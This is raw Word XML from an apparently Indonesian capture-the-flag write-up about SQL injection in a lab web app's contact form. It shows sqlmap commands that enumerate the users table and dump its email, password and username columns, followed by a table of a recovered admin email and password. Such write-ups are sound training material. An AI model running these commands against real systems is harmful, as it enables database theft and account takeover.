          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>dari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0030334B" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> database </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0030334B" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>pengiriman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0030334B">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31972FCB" w14:textId="7410A85B" w:rsidR="006A0A47" w:rsidRPr="006A0A47" w:rsidRDefault="00481F56" w:rsidP="00496DDB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</w:t>
      </w:r>
      <w:r w:rsidR="006A0A47" w:rsidRPr="006A0A47">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006A0A47">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>contact</w:t>
      </w:r>
      <w:r w:rsidR="004C7CDE">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="006A0A47">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="31DAF7DB" w14:textId="77777777" w:rsidR="00B61312" w:rsidRDefault="00481F56" w:rsidP="00496DDB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</w:t>
      </w:r>
      <w:r w:rsidR="006A0A47" w:rsidRPr="006A0A47">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="004C7CDE">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BF815A" w14:textId="0F55F751" w:rsidR="0030334B" w:rsidRDefault="00B61312" w:rsidP="00496DDB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</w:t>
      </w:r>
      <w:r w:rsidR="0007665A" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">Kita </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0007665A" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>akan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0007665A" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0007665A" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>mencari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0007665A" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0007665A" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>kolom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>dari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>berisi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> data </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E25393" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> login </w:t>
      </w:r>
      <w:r w:rsidR="009E50C4" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>admin web CTF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C98C79E" w14:textId="1CBF8E49" w:rsidR="00B6652E" w:rsidRDefault="007E15A9" w:rsidP="00B6652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Command:</w:t>
      </w:r>
      <w:r w:rsidR="00B6652E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B6652E" w:rsidRPr="00B6652E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B6652E" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B6652E" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u 'http://192.168.56.107/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B6652E" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B6652E" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">' --batch --data 'nama=mans&amp;email=mans@gmail.com&amp;subject=faster&amp;message=kerusakan' -D </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B6652E" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>pengiriman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B6652E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> -T users --</w:t>
      </w:r>
      <w:r w:rsidR="009A78AD">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>columns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405BBA1C" w14:textId="4C2EDADB" w:rsidR="007E15A9" w:rsidRDefault="007E15A9" w:rsidP="00496DDB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79012374" w14:textId="30155F41" w:rsidR="00A92F22" w:rsidRDefault="00A92F22" w:rsidP="00CE1164">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60BACAC0" wp14:editId="7EFCDCE2">
            <wp:extent cx="5969000" cy="3981450"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="1315628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D77E" w14:textId="77777777" w:rsidR="00C9337A" w:rsidRDefault="00C9337A" w:rsidP="002A18B1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0634FD30" w14:textId="77777777" w:rsidR="004F3DAF" w:rsidRDefault="004F3DAF" w:rsidP="002A18B1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24CDF0E4" w14:textId="77777777" w:rsidR="004F3DAF" w:rsidRDefault="004F3DAF" w:rsidP="002A18B1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72F0A15B" w14:textId="77777777" w:rsidR="0070173E" w:rsidRDefault="0070173E" w:rsidP="002A18B1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="524670C0" w14:textId="4B5847AA" w:rsidR="00CE6148" w:rsidRDefault="001F2626" w:rsidP="002A18B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CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004F7BF3" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="004F7BF3" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>mail,id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004F7BF3" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> ,</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004F7BF3" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>password,role_</w:t>
      </w:r>
      <w:r w:rsidR="00764810" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>id,username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00764810" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00764810" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00764810" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00764810" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>akan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F35397">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F35397">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>nge</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00764810" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> dump dat</w:t>
      </w:r>
      <w:r w:rsidR="00CE1164" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CE1164" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>dari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CE1164" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00596C01">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">table </w:t>
      </w:r>
      <w:r w:rsidR="00CE1164" w:rsidRPr="00CE1164">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E826565" w14:textId="7508CAC9" w:rsidR="00C9337A" w:rsidRDefault="00DF7C5B" w:rsidP="002A18B1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Command:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DF7C5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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u 'http://192.168.56.107/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">' --batch --data </w:t>
      </w:r>
      <w:r w:rsidR="00201AFF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">'nama=mans&amp;email=mans@gmail.com&amp;subject=faster&amp;message=kerusakan' -D </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>pengiriman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> -T users -</w:t>
      </w:r>
      <w:r w:rsidR="00BE333D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="008656C6" w:rsidRPr="008656C6">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>email,id</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008656C6" w:rsidRPr="008656C6">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>,password,role_id,username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004D6F8D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:r w:rsidR="008656C6" w:rsidRPr="008656C6">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>du</w:t>
      </w:r>
      <w:r w:rsidR="00CD29A6">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>mp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4974BE45" w14:textId="627714DB" w:rsidR="0070173E" w:rsidRDefault="0070173E" w:rsidP="00F35397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0ED04F" wp14:editId="76C01584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6476365" cy="4841875"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="36720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28" cy="486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943CA" w14:textId="0C6038FE" w:rsidR="002A18B1" w:rsidRPr="0010084A" w:rsidRDefault="002A18B1" w:rsidP="0010084A">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F58F5E7" w14:textId="2517BCA6" w:rsidR="00F256D1" w:rsidRDefault="00F256D1" w:rsidP="00B45732">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13089305" w14:textId="57B9BA3E" w:rsidR="00C0741F" w:rsidRPr="00353CD8" w:rsidRDefault="00890B48" w:rsidP="00455D5A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00890B48">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00890B48">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dapati</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C123D8">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2 email login dan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313"/>
      </w:tblGrid>
      <w:tr w:rsidR="001A1509" w14:paraId="59F47EF2" w14:textId="77777777" w:rsidTr="00271E89">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43EB15B0" w14:textId="4AC9A7D6" w:rsidR="001A1509" w:rsidRPr="00922F0B" w:rsidRDefault="00FD7E6C" w:rsidP="00271E89">
            <w:pPr>
              <w:rPr>
                <w:color w:val="C00000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00922F0B">
              <w:rPr>
                <w:color w:val="C00000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CABE81E" w14:textId="22FFE55C" w:rsidR="001A1509" w:rsidRPr="00922F0B" w:rsidRDefault="00FD7E6C" w:rsidP="00271E89">
            <w:pPr>
              <w:rPr>
                <w:color w:val="C00000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00922F0B">
              <w:rPr>
                <w:color w:val="C00000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A1509" w14:paraId="3DDDBBD8" w14:textId="77777777" w:rsidTr="00271E89">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13B6DEA9" w14:textId="46AD2601" w:rsidR="001A1509" w:rsidRDefault="00FD7E6C" w:rsidP="00455D5A">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD7E6C">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">admin@zerobyte.id  </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6988BD94" w14:textId="3501458C" w:rsidR="001A1509" w:rsidRDefault="00FC4A32" w:rsidP="00455D5A">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00FC4A32">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>NgehekAdminYuk</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00FC4A32">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A1509" w14:paraId="7FF2C51D" w14:textId="77777777" w:rsidTr="00271E89">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E7C2894" w14:textId="6D88B72F" w:rsidR="001A1509" w:rsidRDefault="00FC4A32" w:rsidP="00455D5A">
            <w:pPr>
